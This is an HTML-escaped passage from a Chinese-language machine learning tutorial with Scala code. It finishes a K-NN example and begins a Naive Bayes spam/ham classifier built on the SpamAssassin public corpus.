&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;unknownDataPoint&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5.3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4.3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;knn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;unknownDatapoint&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-4&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-5&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Internet Service Provider Alpha&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-7&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-8&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-9&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Internet Service Provider Beta&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-11&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-12&quot;&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-13&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Unexpected prediction&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-15&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0018 seconds] --&gt;
&lt;p&gt;执行这段代码之后，未标记点 (5.3, 4.3) 就被标记为 ISP Alpha。这个点是最容易分类的点之一，它明显落在数据图的 Alpha 区域中。如何做预测已经显而易见，我不再列举其他点，你可以随意尝试其它不同点，看看预测结果。&lt;/p&gt;
&lt;h2&gt;正常/垃圾邮件分类（朴素贝叶斯法）&lt;/h2&gt;
&lt;p&gt;在这个实例中，基于邮件内容，我们将用朴素贝叶斯算法把邮件分为正常邮件与垃圾邮件。朴素贝叶斯算法是计算一个目标在每个可能类别中的几率，然后返回具有最高几率的那个类别。要计算这种几率，算法会使用特征。该算法被称为朴素贝叶斯是由于它不考虑特征之间的任何相关性。换言之，每个特征都一样重要。我举个例子进一步解释：&lt;/p&gt;
&lt;p&gt;假设你正在征颜色、直径和形状这几个特征将水果和蔬菜进行分类，现在有以下类别：苹果、番茄和蔓越莓。&lt;/p&gt;
&lt;p&gt;假设你现在要把一个具有如下特征值的目标分类：（红色、4cm、圆形）。对我们来说，它显然是一个番茄，因为对比苹果它比较小，对比蔓越莓它太大了。然而，朴素贝叶斯算法会独立地评估每个特征，它的分类过程如下：&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;苹果 66.6% 可能性（基于颜色和形状）&lt;br&gt;
番茄 100.0% 可能性（基于颜色、形状和大小）&lt;br&gt;
蔓越莓 66.6% 可能性（基于颜色和形状）&lt;/p&gt;
&lt;p&gt;因此，尽管实际上很明显它不可能是蔓越莓或苹果，朴素贝叶斯仍会给出 66.6% 的机会是这两种情况之一。所以即使它正确地把目标分类为番茄，在边界情况（目标大小刚好超出训练集的范围）下，它也可能给出糟糕的结果。不过，在邮件分类中，朴素贝叶斯算法表现还是不错的，这是由于邮件的好坏无法仅仅通过一个特征（单词）来分类。&lt;/p&gt;
&lt;p&gt;你现在应该大概了解朴素贝叶斯算法了，我们可以继续做之前的实例了。在这个例子中，我们使用 Scala 语言，利用 Smile 库中的朴素贝叶斯实现，将邮件按内容分为垃圾邮件和正常邮件。&lt;/p&gt;
&lt;p&gt;在开始之前还需要你从 SpamAssasins 公共文库上下载这个例子的&lt;a href=&quot;http://spamassassin.apache.org/publiccorpus/&quot;&gt;数据&lt;/a&gt;。你所要用到的数据在 &lt;a href=&quot;http://spamassassin.apache.org/publiccorpus/20030228_easy_ham.tar.bz2&quot;&gt;easy_ham&lt;/a&gt; 和 &lt;a href=&quot;http://spamassassin.apache.org/publiccorpus/20030228_spam.tar.bz2&quot;&gt;spam&lt;/a&gt; 文件里，但其余的文件在你需要做更多实验时也会用到。把这些文件解压之后，修改代码段里的文件路径以适应文件夹的位置。此外，在做筛选时，你还需要用到&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/stopwords.txt&quot;&gt;停用词文件&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;对于每一个机器学习实现，第一步是要加载训练数据。不过在这个例子中，我们需要进一步深入机器学习。在 K-NN 实例中，我们用下载速度和上传速度作为特征。我们并不指明它们是特征，因为它们就是唯一可用的属性。对邮件分类这个例子来说，拿什么作为特征并非毫无意义。要分类出垃圾或正常邮件。你可以使用的特征有发送人、主题、邮件内容，甚至发送时间。&lt;/p&gt;
&lt;p&gt;在这个例子中，我们选用邮件内容作为特征，也就是，我们要在训练集中，从邮件正文中选出特征（此例中是单词）。为了做到这一点，我们需要建立一个&lt;a href=&quot;http://en.wikipedia.org/wiki/Document-term_matrix&quot;&gt;词汇文档矩阵 (TDM&lt;/a&gt;)。&lt;/p&gt;
&lt;p&gt;我们从编写一个加载案例数据的函数开始。这个函数就是  getMessage 方法，在给定一个文件作为参数后，它从一个邮件中获取过滤文本。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061339420286693&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
def getMessage(file : File)  : String  =
  {
    //Note that the encoding of the example files is latin1,
    // thus this should be passed to the fromFile method.
    //注意案例文件采用latin1编码，所以应该把它们传递给fromFile方法
    val source = scala.io.Source.fromFile(file)(&quot;latin1&quot;)
    val lines = source.getLines mkString &quot;n&quot;
    source.close()
    //Find the first line break in the email, 
    //as this indicates the message body
    //在邮件中找出第一个换行符，因为这暗示信息的主体
    val firstLineBreak = lines.indexOf(&quot;nn&quot;)
    //Return the message body filtered by only text from a-z and to lower case
    //返回过滤后的信息主体，即只包含a-z并且为小写的文本。
    return lines
        .substring(firstLineBreak)
        .replace(&quot;n&quot;,&quot; &quot;)
        .replaceAll(&quot;[^a-zA-Z ]&quot;,&quot;&quot;)
        .toLowerCase()
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061339420286693-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061339420286693-20&quot;&gt;20&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Note that the encoding of the example files is latin1,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// thus this should be passed to the fromFile method.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//注意案例文件采用latin1编码，所以应该把它们传递给fromFile方法&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;latin1&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mkString&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Find the first line break in the email, &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//as this indicates the message body&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//在邮件中找出第一个换行符，因为这暗示信息的主体&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;firstLineBreak&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;nn&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Return the message body filtered by only text from a-z and to lower case&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//返回过滤后的信息主体，即只包含a-z并且为小写的文本。&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lines&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;firstLineBreak&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061339420286693-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061339420286693-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0025 seconds] --&gt;
&lt;p&gt;到此，在我们提供的案例数据文件夹中，我们需要一个方法来获取所有邮件的文件名。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06133d945286289&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
